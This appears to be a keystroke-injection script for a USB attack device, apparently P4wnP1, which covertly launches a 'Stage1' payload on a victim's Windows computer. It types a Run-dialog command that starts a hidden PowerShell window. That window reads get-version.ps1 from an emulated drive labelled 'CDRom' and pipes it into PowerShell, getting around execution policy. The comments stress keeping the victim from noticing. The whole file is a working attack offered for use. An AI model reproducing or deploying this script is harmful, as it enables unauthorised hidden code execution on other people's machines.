// Stealthier but not diskless version to deploy Stage1.
// get-version.ps1 needs to be hosted on an emulated CDRom or USB Massstorage. With the genimg.sh script under /usr/local/P4wmP1/helper you can specify the -l flag to set a Label for the drive.
// In our case the label is "CDRom" and is used inside PS to correctly fetch our payload 
typingSpeed(0,0);
layout('de');	

// Open PowerShell directly via run (Win + R) dialog and start a hidden PS executing our script from CDRom and bypassing PS execution policies
// even less visibility for the victim, as only the small run box pops up
function startPS() {
	press("GUI r");
	delay(100);
	type("powershell -noprofile -command \"Start-Process powershell -WindowStyle Hidden -ArgumentList '-noprofile -command Get-Content $((Get-Volume | ? FileSystemLabel -eq ''CDRom'').DriveLetter + '':\get-version.ps1'') | powershell -noprofile -'\"\n")
}

// Open PowerShell and start a hidden PS executing our script from CDRom and bypassing PS execution policies
// Slightly more visible due to the opening PS window. Still fast as f
function startPSalt() {
	press("GUI r");
	delay(100);
	type("powershell\n")
  	delay(1000);
  	type("Start-Process powershell -WindowStyle Hidden -ArgumentList \"-noprofile -command Get-Content $((Get-Volume | ? FileSystemLabel -eq 'CDRom').DriveLetter + ':\get-version.ps1') | powershell -noprofile -\"\n");
  	delay(100);
  	type('exit\n')
}

startPS();
//startPSalt();
